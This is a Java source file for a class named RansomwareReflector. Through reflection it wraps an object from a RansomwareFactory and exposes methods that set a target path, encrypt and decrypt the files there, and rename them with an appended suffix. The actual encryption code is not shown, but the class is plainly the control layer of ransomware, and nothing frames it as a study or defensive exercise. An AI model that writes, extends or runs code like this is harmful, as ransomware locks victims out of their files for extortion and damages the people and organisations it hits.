package leverCom;

import java.lang.reflect.Method;
import java.util.Arrays;

public class RansomwareReflector {
    private Object port;

    public RansomwareReflector() {
        this.port = RansomwareFactory.build();
    }

    public String setPath(String path) {
        try {
            Method setPathMethod = port.getClass().getDeclaredMethod("setPath", String.class);
            return (String) setPathMethod.invoke(port, path);
        } catch (Exception ex) {
            System.err.println(ex.getMessage());
            System.err.println(Arrays.toString(ex.getStackTrace()));
            return null;
        }
    }

    public Boolean encrypt() {
        try {
            Method encryptMethod = port.getClass().getDeclaredMethod("encrypt");
            return (Boolean) encryptMethod.invoke(port);
        } catch (Exception ex) {
            System.err.println(ex.getMessage());
            System.err.println(Arrays.toString(ex.getStackTrace()));
            return null;
        }
    }

    public Boolean decrypt() {
        try {
            Method decryptMethod = port.getClass().getDeclaredMethod("decrypt");
            return (Boolean) decryptMethod.invoke(port);
        } catch (Exception ex) {
            System.err.println(ex.getMessage());
            System.err.println(Arrays.toString(ex.getStackTrace()));
            return null;
        }
    }

    public Boolean rename(String appendix, Boolean shouldBeAdded) {
        try {
            Method renameMethod = port.getClass().getDeclaredMethod("rename", String.class, Boolean.class);
            return (Boolean) renameMethod.invoke(port, appendix, shouldBeAdded);
        } catch (Exception ex) {
            System.err.println(ex.getMessage());
            System.err.println(Arrays.toString(ex.getStackTrace()));
            return null;
        }
    }

}
